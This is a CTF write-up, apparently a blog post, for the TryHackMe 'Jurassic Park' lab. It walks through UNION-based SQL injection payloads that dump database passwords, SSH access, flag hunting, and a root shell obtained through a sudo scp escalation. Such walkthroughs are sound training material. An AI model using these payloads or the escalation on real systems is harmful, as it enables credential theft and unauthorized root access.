---
clayout: ctf
title: Jurassic Park
type: TryHackMe
date: 2025-04-12
level: Hard
icon: /ctf/tryhackme/jurassic-park/icon-room.png
image: /ctf/tryhackme/jurassic-park/icon-room.png
banner: /ctf/tryhackme/jurassic-park/banner-room.png
description: A Jurassic Park CTF
ctf-link: https://tryhackme.com/room/jurassicpark
---

## Challenge Overview

The target machine hosts a Jurassic Park–themed application. The goal is to enumerate services, identify vulnerabilities, exploit SQL injection to gain credentials, pivot to SSH access, and escalate privileges to root.

## Enumeration

### Nmap

We start with a service scan:

```bash
nmap -sC -sV -p- -oN nmap.txt 10.10.73.33
```

**Results:**

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

**Key Findings:**

* **SSH** (22/tcp) → OpenSSH 7.2p2 (Ubuntu 16.04)
* **HTTP** (80/tcp) → Apache 2.4.18 serving a simple website

### Web Enumeration

Accessing `http://10.10.73.33` shows a Jurassic Park–themed homepage with a package shop.

![Jurassic Park Home](/ctf/tryhackme/jurassic-park/home.png)

* Package detail pages use the parameter `id` (`item.php?id=1`).
* Injecting a double quote (`"`) into the parameter produces a **MySQL syntax error**, confirming SQL injection.

With the `id` parameter set to `5`, we can see the following page:

![Jurassic Park Item](/ctf/tryhackme/jurassic-park/item-5.png)

Those words `'` `#` `DROP` `-` `username` `@` `----` are blocked, we can't use them in the payload. Using these words, we got this error:

![Jurassic Park Error](/ctf/tryhackme/jurassic-park/sql-injection-error.png)

## Exploitation

### SQL Injection

Testing the injection with UNION queries reveals the number of columns and confirms exploitation is possible.

**Extracting database version:**

```sql
?id=1 UNION SELECT NULL,NULL,NULL,NULL,VERSION()
```

**Output:**
`5.7.25-0ubuntu0.16.04.2` (Ubuntu 16.04)

**Enumerating tables:**

```sql
?id=1 UNION SELECT NULL,NULL,NULL,NULL,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()
```

**Output:**
`items,users`

**Enumerating columns from `users`:**

```sql
?id=1 UNION SELECT NULL,NULL,NULL,NULL,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name="users"
```

**Output:**
`id,username,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS`

**Dumping credentials:**

```sql
?id=1 UNION SELECT NULL,NULL,NULL,NULL,GROUP_CONCAT(password) FROM users
```

**Output:**
`D0nt3ATM3,ih8dinos`

### Initial Access (SSH)

With the credentials, we gain SSH access:

```bash
ssh dennis@10.10.73.33
```

```bash
$ id
uid=1001(dennis) gid=1001(dennis) groups=1001(dennis)
```

> [!IMPORTANT] First flag
> `/home/dennis/flag1.txt`

### Second flag

Using `find`, we can find the second flag:

```bash
find / -type f -name "*flag*.txt" 2>/dev/null
```

> [!IMPORTANT] Second flag
> `/boot/grub/fonts/flagTwo.txt`

### Third flag

Using `grep`, we can find the third flag:

```bash
grep -Rsi "flag" /home 2>/dev/null
```

> [!IMPORTANT] Third flag
> `/home/dennis/.bash_history`

## Privilege Escalation

### Sudo Privileges

Checking sudo permissions:

```bash
sudo -l
```

**Output:**

```text
User dennis may run the following commands on ip-10-10-29-186:
    (ALL) NOPASSWD: /usr/bin/scp
```

The `scp` binary is listed, which can be abused via [GTFOBins](https://gtfobins.github.io/gtfobins/scp/#sudo).

![Sudo](/ctf/tryhackme/jurassic-park/gtfobins-scp.png)

### Root Shell via SCP

Following the GTFOBins method:

```bash
TF=$(mktemp)
echo 'sh 0<&2 1>&2' > $TF
chmod +x "$TF"
sudo scp -S $TF x y:
```

We now have a root shell:

```bash
$ id
uid=0(root) gid=0(root) groups=0(root)
```

> [!IMPORTANT] Fifth flag
> `/root/flag5.txt`

## References

* [GTFOBins – scp](https://gtfobins.github.io/gtfobins/scp/#sudo)
